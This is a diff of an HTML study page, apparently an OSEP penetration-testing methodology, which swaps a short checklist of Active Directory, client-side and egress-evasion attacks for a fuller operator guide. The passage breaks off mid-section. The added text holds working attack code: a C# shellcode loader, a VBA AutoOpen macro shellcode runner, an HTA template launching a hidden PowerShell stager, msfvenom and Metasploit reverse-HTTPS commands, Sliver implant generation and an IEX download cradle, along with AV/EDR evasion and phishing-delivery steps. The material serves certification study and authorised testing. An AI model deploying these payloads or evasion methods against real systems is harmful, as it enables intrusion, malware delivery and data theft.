-  <li><input type="checkbox" data-id="osep-linked"> Abuse linked servers to pivot and execute across trust relationships</li>
-  <li><input type="checkbox" data-id="osep-mssql-discover"> Discover SQL instances via SPNs, browser service (UDP 1434), and BloodHound</li>
-  <li><input type="checkbox" data-id="osep-mssql-impersonate"> Enumerate and abuse <code>EXECUTE AS</code> / IMPERSONATE chains to reach sysadmin</li>
-  <li><input type="checkbox" data-id="osep-mssql-relay"> Relay or coerce SQL service authentication; relay to other SQL servers or LDAP</li>
-  <li><input type="checkbox" data-id="osep-mssql-ole"> Use OLE Automation procedures or registry/agent jobs when xp_cmdshell is disabled</li>
-  <li><input type="checkbox" data-id="osep-mssql-creds"> Recover linked-server and stored connection credentials for further pivoting</li>
-</ul>
-<h3 id="methodology-clientside">11.10 Client-Side Attack Vectors</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-cs-macro"> Build a VBA macro payload (Word/Excel) with an encrypted, staged loader rather than raw shellcode</li>
-  <li><input type="checkbox" data-id="osep-cs-autoopen"> Use <code>AutoOpen</code>/<code>Document_Open</code>/<code>Workbook_Open</code> triggers and remote-template injection where direct macros are blocked</li>
-  <li><input type="checkbox" data-id="osep-cs-xlm"> Consider Excel 4.0 (XLM) macros or VBA-stomping to reduce static detection</li>
-  <li><input type="checkbox" data-id="osep-cs-hta"> Build an HTA payload (mshta) with embedded VBScript/JScript and an obfuscated stager</li>
-  <li><input type="checkbox" data-id="osep-cs-wsh"> Build a JScript/WSH (.js/.wsf) loader; abuse DotNetToJScript or GadgetToJScript to run a .NET assembly</li>
-  <li><input type="checkbox" data-id="osep-cs-lnk"> Weaponize LNK / ISO / IMG / OneNote containers to bypass mark-of-the-web and gateway filtering</li>
-  <li><input type="checkbox" data-id="osep-cs-calendar"> Use calendar/meeting invite phishing or OWA rules where email body/attachment filters are strict</li>
-  <li><input type="checkbox" data-id="osep-cs-stage1"> Stage 1: minimal first-stage downloader that fetches the encrypted second stage over HTTPS</li>
-  <li><input type="checkbox" data-id="osep-cs-stage2"> Stage 2: decrypt in memory and execute via a reflective loader (no disk artifacts)</li>
-  <li><input type="checkbox" data-id="osep-cs-reflective"> Reflectively load a PE/.NET assembly in-memory (Donut, reflective DLL injection)</li>
-  <li><input type="checkbox" data-id="osep-cs-hollow"> Process hollowing: spawn a suspended legit process, unmap/overwrite its image, and resume into your payload</li>
-  <li><input type="checkbox" data-id="osep-cs-injection"> Process injection (CreateRemoteThread, APC queue, thread hijack, early-bird) into a trusted host process</li>
-  <li><input type="checkbox" data-id="osep-cs-ppid"> Spoof the parent PID and command line so the child process looks benign in telemetry</li>
-  <li><input type="checkbox" data-id="osep-cs-guardrails"> Add guardrails: domain/user/locale checks and sandbox evasion so the payload only fires on the real target</li>
-  <li><input type="checkbox" data-id="osep-cs-persist"> Establish user-level persistence (Run key, scheduled task, startup) on the client foothold</li>
-</ul>
-<h3 id="methodology-egress">11.11 Network Filter &amp; Egress Evasion</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-eg-test"> Profile egress: which ports/protocols leave the network (80/443/53), and whether a proxy is enforced</li>
-  <li><input type="checkbox" data-id="osep-eg-proxy"> Make C2/stager proxy-aware (system proxy, NTLM/Kerberos auth) to traverse the corporate web proxy</li>
-  <li><input type="checkbox" data-id="osep-eg-categorize"> Use an aged, categorized C2 domain and clean TLS to pass web-proxy category/reputation filters</li>
-  <li><input type="checkbox" data-id="osep-eg-domain-front"> Domain-front C2 through a trusted CDN (front a high-reputation SNI/Host) to evade SNI/domain filtering</li>
-  <li><input type="checkbox" data-id="osep-eg-dns-tunnel"> Use DNS tunneling (iodine/dnscat2/C2 DNS channel) when only DNS resolves outbound</li>
-  <li><input type="checkbox" data-id="osep-eg-dns-filter"> Defeat DNS filters by using the internal resolver as the upstream for the DNS channel</li>
-  <li><input type="checkbox" data-id="osep-eg-ids"> Evade IDS/IPS signatures: encrypt payloads, randomize URIs/user-agents, add jitter and malleable profiles</li>
-  <li><input type="checkbox" data-id="osep-eg-ja3"> Blend TLS fingerprint (JA3/JA3S, valid cert, common ALPN) so beacons resemble normal browser traffic</li>
-  <li><input type="checkbox" data-id="osep-eg-https"> Prefer HTTPS over a trusted redirector with realistic headers and traffic shaping</li>
-  <li><input type="checkbox" data-id="osep-eg-fallback"> Configure fallback channels (HTTP &rarr; DNS &rarr; SMB) so loss of one egress path does not kill C2</li>
-</ul>
-<h3 id="methodology-kiosk">11.12 Kiosk / Restricted Environment Breakout</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-ki-enum"> Enumerate the restriction mechanism (kiosk app, Citrix/RDS published app, browser lockdown, GPO restrictions)</li>
-  <li><input type="checkbox" data-id="osep-ki-dialogs"> Abuse common dialogs (File &rarr; Open/Save, Print, Help) to reach a file browser or address bar</li>
-  <li><input type="checkbox" data-id="osep-ki-uri"> Use URI handlers, UNC paths, and <code>file://</code>/<code>\\server\share</code> navigation to escape the application sandbox</li>
-  <li><input type="checkbox" data-id="osep-ki-shortcut"> Abuse keyboard shortcuts and accessibility features (Sticky Keys, Win+R, Ctrl+Shift+Esc) to spawn a shell</li>
-  <li><input type="checkbox" data-id="osep-ki-browser"> Break out of locked browsers via address bar, downloads, dev tools, or external protocol handlers</li>
-  <li><input type="checkbox" data-id="osep-ki-explorer"> Reach explorer.exe / cmd.exe / powershell.exe through embedded controls or LOLBAS launchers</li>
-  <li><input type="checkbox" data-id="osep-ki-applocker"> Identify and bypass AppLocker/WDAC policy in the kiosk to run arbitrary tooling</li>
-  <li><input type="checkbox" data-id="osep-ki-citrix"> Citrix/RDS: escape the published app to a full desktop, then enumerate the underlying session host</li>
-  <li><input type="checkbox" data-id="osep-ki-execute"> Once broken out, drop a runner and re-establish C2 from inside the restricted host</li>
-</ul>
-<h3 id="methodology-delegation">11.13 Kerberos Delegation Abuse</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-del-enum"> Enumerate delegation settings across the domain (unconstrained, constrained, RBCD) with PowerView/BloodHound</li>
-  <li><input type="checkbox" data-id="osep-del-unconstrained"> Unconstrained: compromise a host with unconstrained delegation, capture cached TGTs of authenticating users</li>
-  <li><input type="checkbox" data-id="osep-del-coerce-dc"> Coerce a DC (PrinterBug/PetitPotam) to authenticate to the unconstrained host and capture the DC's TGT</li>
-  <li><input type="checkbox" data-id="osep-del-constrained"> Constrained (S4U2Proxy): abuse an account trusted for delegation to specific SPNs to impersonate any user to that service</li>
-  <li><input type="checkbox" data-id="osep-del-s4u"> Use S4U2Self + S4U2Proxy (Rubeus <code>s4u</code>) to obtain a service ticket as a high-privileged user</li>
-  <li><input type="checkbox" data-id="osep-del-protocol-transition"> Exploit protocol transition (TrustedToAuthForDelegation) to impersonate without the user's initial Kerberos auth</li>
-  <li><input type="checkbox" data-id="osep-rbcd"> RBCD: with write access to a computer object, set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> to a controlled account and S4U to it</li>
-  <li><input type="checkbox" data-id="osep-rbcd-machine"> Create or take over a machine account (MachineAccountQuota) to use as the RBCD source principal</li>
-  <li><input type="checkbox" data-id="osep-shadow-creds"> Shadow Credentials: write <code>msDS-KeyCredentialLink</code> (Whisker/Certipy) to authenticate as the object via PKINIT and recover its NT hash</li>
-  <li><input type="checkbox" data-id="osep-del-altservice"> Abuse the <code>altservice</code> trick to retarget a constrained-delegation ticket to another SPN on the same host</li>
-  <li><input type="checkbox" data-id="osep-del-ptt"> Inject the resulting service ticket (PTT) and access the target service (CIFS, HOST, HTTP, LDAP, MSSQL)</li>
-</ul>
-<h3 id="methodology-acl">11.14 AD ACL &amp; Object Permission Abuse</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-aclx-enum"> Map object ACLs with BloodHound; identify principals you control that have dangerous rights</li>
-  <li><input type="checkbox" data-id="osep-aclx-genericall"> GenericAll / GenericWrite over a user: set an SPN and targeted-Kerberoast, or reset attributes to take over</li>
-  <li><input type="checkbox" data-id="osep-aclx-forcechange"> ForceChangePassword: reset a target user's password to gain control of the account</li>
-  <li><input type="checkbox" data-id="osep-aclx-targeted-kerb"> Targeted Kerberoast: temporarily add an SPN to a user you can write, roast, then remove the SPN</li>
-  <li><input type="checkbox" data-id="osep-aclx-writedacl"> WriteDACL: grant yourself additional rights (e.g. DCSync) on the object or domain head</li>
-  <li><input type="checkbox" data-id="osep-aclx-writeowner"> WriteOwner: take ownership of the object, then write a DACL granting full control</li>
-  <li><input type="checkbox" data-id="osep-aclx-group"> GenericAll/WriteMembers over a group: add a controlled user to a privileged group</li>
-  <li><input type="checkbox" data-id="osep-aclx-computer"> GenericWrite over a computer: configure RBCD or write shadow credentials to take it over</li>
-  <li><input type="checkbox" data-id="osep-aclx-gpo"> WriteProperty/WriteDACL on a GPO: edit the GPO to push code execution or add local admins</li>
-  <li><input type="checkbox" data-id="osep-aclx-dcsync"> Grant DS-Replication-Get-Changes / All on the domain object to enable DCSync from a low-priv principal</li>
-  <li><input type="checkbox" data-id="osep-aclx-cleanup"> Record and revert every ACL/SPN/attribute change you make for clean-up and reporting</li>
-</ul>
-<h3 id="methodology-adcs">11.15 AD Certificate Services (ADCS)</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-adcs-enum"> Enumerate CAs and certificate templates (Certify <code>find</code> / Certipy <code>find</code>) and flag vulnerable ESC configurations</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc1"> ESC1: template allows requester-supplied SAN with client-auth EKU and low enrollment rights &rarr; request a cert as any user (e.g. Domain Admin)</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc2"> ESC2: template with Any Purpose / no EKU restriction &rarr; use it to authenticate or sign as an arbitrary principal</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc3"> ESC3: abuse an Enrollment Agent template to request certificates on behalf of other users</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc4"> ESC4: you have write access over a template's ACL &rarr; reconfigure it into an ESC1-style vulnerable template</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc5"> ESC5: compromise CA-related objects (CA computer, PKI objects) via their object ACLs</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc6"> ESC6: CA has <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> set &rarr; supply an arbitrary SAN on any template</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc7"> ESC7: you hold ManageCA / ManageCertificates rights &rarr; enable an attack, approve a request, or grant enrollment</li>
-  <li><input type="checkbox" data-id="osep-adcs-esc8"> ESC8: relay NTLM (coerced DC auth) to the CA web-enrollment endpoint to obtain a DC/user certificate</li>
-  <li><input type="checkbox" data-id="osep-adcs-auth"> Authenticate with the malicious certificate via PKINIT to obtain a TGT (Rubeus <code>asktgt</code> / Certipy <code>auth</code>)</li>
-  <li><input type="checkbox" data-id="osep-adcs-ntlm"> Recover the account's NT hash from the PKINIT TGT (UnPAC-the-hash) for further use</li>
-  <li><input type="checkbox" data-id="osep-adcs-persist"> Use a long-lived user/machine certificate for stealthy persistence that survives password resets</li>
-</ul>
-<h3 id="methodology-trusts">11.16 Domain &amp; Forest Trust Attacks</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-trust-enum"> Enumerate domain/forest trusts, their direction, and transitivity (PowerView, nltest, BloodHound)</li>
-  <li><input type="checkbox" data-id="osep-trust-intra-golden"> Intra-forest: escalate from child to parent (forest root) using a Golden Ticket with SID history of Enterprise Admins</li>
-  <li><input type="checkbox" data-id="osep-trust-sid-history"> Inject the parent-domain Enterprise Admins SID into a forged ticket's SID history (no SID filtering inside a forest)</li>
-  <li><input type="checkbox" data-id="osep-trust-key"> Dump the inter-realm trust key (trust account hash) to forge inter-realm TGTs across the trust</li>
-  <li><input type="checkbox" data-id="osep-trust-ticket"> Forge an inter-realm referral ticket with the trust key to access resources in the trusting domain</li>
-  <li><input type="checkbox" data-id="osep-trust-cross-forest"> Cross-forest: account for SID filtering; abuse foreign-group memberships, ACLs, and shared local-admin access instead</li>
-  <li><input type="checkbox" data-id="osep-trust-foreign"> Enumerate foreign security principals and foreign group members that grant access across the trust boundary</li>
-  <li><input type="checkbox" data-id="osep-trust-kerberoast"> Kerberoast/AS-REP roast across trusts where target SPNs/accounts are reachable through the trust</li>
-  <li><input type="checkbox" data-id="osep-trust-adcs"> Abuse cross-forest ADCS enrollment or PKI trust where a CA is shared/trusted between forests</li>
-</ul>
-<h3 id="methodology-objectives">11.17 Objectives &amp; Reporting</h3>
-<ul>
-  <li><input type="checkbox" data-id="osep-flags"> Collect all flags (<code>local.txt</code> / <code>proof.txt</code>) via interactive shells</li>
-  <li><input type="checkbox" data-id="osep-notes"> Document each step with commands, screenshots, and timestamps for the report</li>
-  <li><input type="checkbox" data-id="osep-objective-map"> Re-read the engagement objectives and confirm every required goal/flag is achieved</li>
-  <li><input type="checkbox" data-id="osep-da-proof"> Prove domain compromise (DA/EA access, DCSync, NTDS dump) with clear evidence</li>
-  <li><input type="checkbox" data-id="osep-loot"> Catalogue looted credentials, tickets, and certificates with where each was obtained</li>
-  <li><input type="checkbox" data-id="osep-cleanup"> Clean up artifacts: remove payloads, revert ACL/SPN/template changes, and note anything left behind</li>
-  <li><input type="checkbox" data-id="osep-timeline"> Build an attack-path timeline tying each foothold and escalation together for the narrative</li>
-  <li><input type="checkbox" data-id="osep-remediation"> Provide actionable remediation for each finding (config, patch, hardening, detection)</li>
-</ul>
+<p>Operator-checklist methodology. Each phase walks the engagement end-to-end: pick the primitive, validate the precondition, run the command, verify the outcome, document, move on.</p>
+
+<h3 id="methodology-tools-setup">11.1 Tools & Setup</h3>
+<p>Build the lab, the toolchain, and the payload-build pipeline before any engagement traffic flows.</p>
+<h4 id="methodology-tools-setup-lab">11.1.1 Lab Environment</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0"> Stand up an attacker VM with the engagement&rsquo;s toolchain:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-0"> Kali / Parrot or hardened Debian</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-1"> Sliver / Mythic / Metasploit installed and validated</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-2"> C# build chain: <code>dotnet</code> + Visual Studio Build Tools</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-3"> PowerShell with v2 fallback for legacy targets</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1"> Stage a clean Windows VM for payload testing:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1-0"> Match the target OS build where possible</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1-1"> Install the target AV/EDR if obtainable (Defender at minimum)</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1-2"> Snapshot before each detonation test</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2"> Set up a payload-staging web server with TLS:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2-0"> <code>python3 -m http.server 80</code> for ad-hoc</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2-1"> nginx with redirector config for engagement traffic</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2-2"> Let&rsquo;s Encrypt cert for the C2 domain</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Validate toolchain on attacker VM
+msfconsole --version
+sliver-server version
+dotnet --list-sdks
+pwsh -v
+
+# Snapshot the test VM before each detonation
+VBoxManage snapshot "Win10-Target" take "clean-baseline"</code></pre>
+
+<h4 id="methodology-tools-setup-shellcode-loader">11.1.2 Shellcode Loader Skeleton</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0"> Pick a loader language that fits the target&rsquo;s execution policy:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-0"> C# when .NET 4.x is present and CLM is off</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-1"> C/C++ when AppLocker DLL rules permit</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-2"> PowerShell when CLM is off</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-3"> VBA when Office macros are allowed</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1"> Avoid the obvious load-time signatures:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1-0"> No <code>VirtualAlloc + RWX</code> single-call pattern</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1-1"> No <code>CreateThread</code> immediately after copying shellcode</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1-2"> No hard-coded shellcode in <code>.data</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-2"> Test before delivery:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-2-0"> Run against Defender with cloud-protection on</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-2-1"> Run against an unhooked process tree to see if hooks are flagging</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-csharp">// Minimal C# shellcode loader skeleton (OSEP baseline)
+using System;
+using System.Runtime.InteropServices;
+
+class Loader {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr addr, uint sz,
+        uint type, uint protect);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr attr, uint stk,
+        IntPtr start, IntPtr param, uint flags, IntPtr tid);
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    static void Main() {
+        // XOR-decrypt shellcode at runtime — never store raw
+        byte[] enc = new byte[] { /* encrypted shellcode */ };
+        byte[] buf = Decrypt(enc, 0xFA);
+
+        // Allocate RW, copy, then flip to RX (two-step)
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
+            0x3000, 0x04);            // MEM_COMMIT|RESERVE, PAGE_READWRITE
+        Marshal.Copy(buf, 0, addr, buf.Length);
+        VirtualProtect(addr, (uint)buf.Length, 0x20, out _); // PAGE_EXECUTE_READ
+
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
+            IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+
+    static byte[] Decrypt(byte[] data, byte key) {
+        byte[] result = new byte[data.Length];
+        for (int i = 0; i &lt; data.Length; i++)
+            result[i] = (byte)(data[i] ^ key);
+        return result;
+    }
+}</code></pre>
+
+<h4 id="methodology-tools-setup-listener">11.1.3 Payload Delivery & Listener</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-0"> Stand up listener and validate end-to-end:</li>
+  </ul>
+<pre><code class="language-bash"># Metasploit multi/handler
+msfconsole -q -x "use exploit/multi/handler; \
+  set payload windows/x64/meterpreter/reverse_https; \
+  set LHOST [ip]; set LPORT 443; \
+  set ExitOnSession false; exploit -j"</code></pre>
+<pre><code class="language-bash"># Sliver HTTPS listener
+sliver-server
+https -l 443 -d [c2-domain]
+generate --http https://[c2-domain] --save ./implants/</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-0-1"> Verify TLS handshake works through the redirector before sending payloads</li>
+    <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1"> Plan a fallback channel before delivery:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1-0"> Different protocol (HTTPS &rarr; DNS, mTLS &rarr; HTTP)</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1-1"> Different TLD on different infra</li>
+        <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1-2"> Documented in your handoff notes</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a></p>
+
+<h3 id="methodology-reconnaissance">11.2 Reconnaissance</h3>
+<p>Map the surface before you touch it. Scan &rarr; enumerate &rarr; research &rarr; attack &mdash; exhaust each stage before advancing.</p>
+<h4 id="methodology-reconnaissance-external-scan">11.2.1 External Scanning</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-0"> Discover hosts and the full port surface:</li>
+  </ul>
+<pre><code class="language-bash"># Full TCP scan
+nmap -p- -T4 -Pn -oA scans/all-tcp [ip]
+
+# Top UDP ports
+nmap -sU --top-ports 100 -oA scans/udp [ip]
+
+# Fast triage with rustscan piped to nmap
+rustscan -a [ip] --greppable 2&gt;/dev/null \
+  | grep -oP '\d+(?=/)' | paste -sd ',' - \
+  | xargs -I{} nmap -p{} -sV -sC [ip]</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-1"> Service version &amp; default-script sweep on every open port:</li>
+  </ul>
+<pre><code class="language-bash">nmap -p [ports] -sV -sC --version-intensity 9 -oA scans/vers [ip]</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-2"> Quick web banner check for any HTTP/HTTPS port:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-2-0"> <code>curl -ksI https://[ip]:[port]/</code></li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-2-1"> <code>whatweb -a 3 https://[ip]:[port]/</code></li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-2-2"> <code>nuclei -u https://[ip]:[port]/ -severity medium,high,critical</code></li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> &middot; <a href="https://wadcoms.github.io/" target="_blank" rel="noopener noreferrer">WADComs</a></p>
+
+<h4 id="methodology-reconnaissance-internal-scan">11.2.2 Internal Scanning From the Foothold</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-0"> Pick the right scanner for the foothold&rsquo;s posture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-0-0"> No nmap: Meterpreter <code>portscan</code> module</li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-0-1"> PowerShell only: <code>1..1024 | %{ Test-NetConnection [ip] -Port $_ }</code></li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-0-2"> BOF: <code>portscan [target] [ports] arp 1024</code></li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-0-3"> Smuggle nmap via SOCKS: <code>proxychains nmap -sT -Pn -p- [ip]</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-1"> Discover subnets, not just hosts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-1-0"> Read <code>route print</code> / <code>ip route</code> for routing tables</li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-1-1"> Read <code>arp -a</code> for L2 neighbours</li>
+        <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-1-2"> Read DNS zone hints from <code>/etc/resolv.conf</code> / <code>ipconfig /displaydns</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> &middot; <a href="https://wadcoms.github.io/" target="_blank" rel="noopener noreferrer">WADComs</a></p>
+
+<h3 id="methodology-initial-access">11.3 Initial Access</h3>
+<p>Land code execution with the least-noisy delivery the engagement allows.</p>
+<h4 id="methodology-initial-access-phishing">11.3.1 Phishing</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0"> Pick the delivery container that survives the mail gateway:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0-0"> Macro-enabled Office doc (.docm / .xlsm)</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0-1"> HTA via .url shortcut</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0-2"> ISO/IMG container to defeat MOTW</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0-3"> OneNote .one with embedded payload</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0-4"> Calendar .ics with payload-bearing URL</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-1"> Stage the loader so it survives runtime AV:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-1-0"> Keep shellcode encrypted at rest</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-1-1"> Resolve APIs at runtime, not via IAT</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-1-2"> Use indirect syscalls for sensitive Nt* calls</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-2"> Add a callback ping that does not look like a callback:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-2-0"> Single HEAD request to a CDN-fronted URL</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-2-1"> DNS TXT lookup to your authoritative server</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-2-2"> Image fetch to a normal-looking subdomain</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-3"> Pre-flight checks before sending:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-3-0"> SPF/DKIM/DMARC on the sending domain</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-3-1"> Mail body renders identically in Outlook + OWA + Gmail</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-3-2"> Macro fires under Protected View &rarr; OK to send</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-vb">' VBA Macro Skeleton — shellcode runner with XOR decrypt
+' Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_https
+'   LHOST=[ip] LPORT=443 -f vbapplication
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+    ByVal lpAddr As LongPtr, ByVal dwSize As Long, _
+    ByVal flType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
+    ByVal dest As LongPtr, ByRef src As Any, ByVal sz As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+    ByVal lpAttr As Long, ByVal dwStk As Long, _
+    ByVal lpStart As LongPtr, ByVal lpParam As Long, _
+    ByVal dwFlags As Long, ByVal lpTid As Long) As LongPtr
+
+Sub AutoOpen()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+
+    ' XOR-encrypted shellcode array (key = 0xFA)
+    buf = Array(72, 131, 228, ...)  ' truncated — paste full array
+
+    ' Decrypt
+    For i = 0 To UBound(buf)
+        buf(i) = buf(i) Xor &amp;HFA
+    Next i
+
+    addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        RtlMoveMemory addr + counter, data, 1
+    Next counter
+    CreateThread 0, 0, addr, 0, 0, 0
+End Sub</code></pre>
+<pre><code class="language-html">&lt;!-- HTA Payload Template --&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;script language="VBScript"&gt;
+Sub RunPayload()
+    Set shell = CreateObject("Wscript.Shell")
+    ' Download cradle — pulls and executes a PowerShell stager
+    shell.Run "powershell -nop -w hidden -enc &lt;base64-payload&gt;", 0, False
+End Sub
+RunPayload
+self.close
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><strong>References:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> &middot; <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a></p>
+
+<h4 id="methodology-initial-access-payloads">11.3.2 Payloads</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0"> C# loader checklist:</li>
+  </ul>
+<pre><code class="language-bash"># Generate shellcode
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=[ip] LPORT=443 -f csharp -o sc.txt
+
+# Compile loader
+csc /target:exe /platform:x64 loader.cs
+
+# Convert .NET assembly to shellcode (for injection)
+donut -i SharpHound.exe -o sh.bin -f 1</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0-1"> AMSI bypass before any in-process .NET assembly load</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0-2"> Encrypt shellcode with AES or XOR, decrypt at runtime</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0-3"> Test with <code>sgn -a 32 shellcode.bin</code> for polymorphic encoding</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-1"> PowerShell loader checklist:</li>
+  </ul>
+<pre><code class="language-powershell"># Download cradle (encrypted)
+IEX(New-Object Net.WebClient).DownloadString('http://[ip]/loader.ps1')
+
+# Base64 encoded command for one-liner delivery
